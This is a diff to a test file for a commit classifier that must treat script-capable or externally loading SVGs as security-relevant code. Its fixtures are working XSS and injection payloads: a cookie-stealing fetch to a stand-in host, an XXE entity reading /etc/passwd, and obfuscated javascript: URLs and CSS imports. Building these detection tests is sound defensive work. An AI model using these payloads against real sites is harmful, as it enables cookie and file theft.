@@ -105,8 +105,8 @@ describe('GST-911 misread 1: a chart SVG is data, an SVG that can run code is se
   }, 60_000);
 
   // Value: protects=an SVG that can execute script stays code and gets the security class (full depth), however it spells the script;
-  //   fails_when=a script element, a namespaced script, an event handler, a javascript: URL (plain or entity-encoded) or a
-  //   foreignObject plans as docs or loses the security class; seam=collectCommit + depthOfCommitInput
+  //   fails_when=a script element, a namespaced script, an event handler, a javascript: URL (plain, entity-encoded or zero-padded) or a
+  //   foreignObject plans as docs or loses the security class, or a handler or URL split across lines loses it; seam=collectCommit + depthOfCommitInput
   test.each([
     ['a script element', '  <script>fetch("https://x.test/?c=" + document.cookie)</script>'],
     ['a namespaced script', '  <s:script xmlns:s="http://www.w3.org/2000/svg">window.x = 42</s:script>'],
@@ -114,13 +114,17 @@ describe('GST-911 misread 1: a chart SVG is data, an SVG that can run code is se
     ['a javascript: URL', '  <a xlink:href="javascript:alert(1)"><text>x</text></a>'],
     ['an entity-encoded javascript: URL', '  <a href="&#106;avascript&#58;alert(1)"><text>x</text></a>'],
     ['a foreignObject', '  <foreignObject width="10" height="10"><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject>'],
+    ['a zero-padded javascript: URL', '  <a href="&#0000000000106;avascript:alert(1)"><text>x</text></a>'],
+    ['an event handler split across lines', '  <rect width="10" onload\n    ="alert(1)"/>'],
+    ['a javascript: URL split across lines', '  <a href="java\nscript:alert(1)"><text>x</text></a>'],
   ])('%s stays code with the security class', (_name, line) => {
     const fx = fixture();
     expect(plan(fx, fx.commit({ 'results/chart.svg': chart(5, line) }))).toMatchObject({ class: 'code', depth: 'full', risk: ['security'] });
   }, 60_000);
 
   // Value: protects=only an SVG made of drawing elements is data: anything that loads, links or declares outside that set stays code;
-  //   fails_when=an external image or stylesheet, an entity declaration, an animation or a CSS url() to another document reads as docs; seam=collectCommit + depthOfCommitInput
+  //   fails_when=an external image or stylesheet, an entity declaration, an animation or a CSS url() to another document reads as docs,
+  //   including through a CSS escape or a zero-padded character reference (review pass 1 findings); seam=collectCommit + depthOfCommitInput
   test.each([
     ['an external image', '  <image href="https://x.test/pixel.png" width="1" height="1"/>'],
     ['a CSS import', '  <style>@import url("https://x.test/a.css");</style>'],
@@ -128,6 +132,10 @@ describe('GST-911 misread 1: a chart SVG is data, an SVG that can run code is se
     ['an animation', '  <animate attributeName="x" from="0" to="10" dur="1s"/>'],
     ['a stylesheet processing instruction', '<?xml-stylesheet href="https://x.test/a.css"?>'],
     ['an entity declaration', '<!DOCTYPE svg [ <!ENTITY e SYSTEM "file:///etc/passwd"> ]>'],
+    ['a CSS-escaped import', '  <style>@\\69mport "https://x.test/a.css";</style>'],
+    ['a CSS-escaped url()', '  <rect style="fill: u\\72l(https://x.test/a.svg#g)"/>'],
+    ['a zero-padded character reference import', '  <style>@&#0000000000105;mport "https://x.test/a.css";</style>'],
+    ['a zero-padded hex character reference url()', '  <rect style="fill: u&#x0000000072;l(https://x.test/a.svg#g)"/>'],
   ])('%s keeps the SVG code', (_name, line) => {
     const fx = fixture();
     expect(plan(fx, fx.commit({ 'results/chart.svg': chart(5, line) })).class).toBe('code');
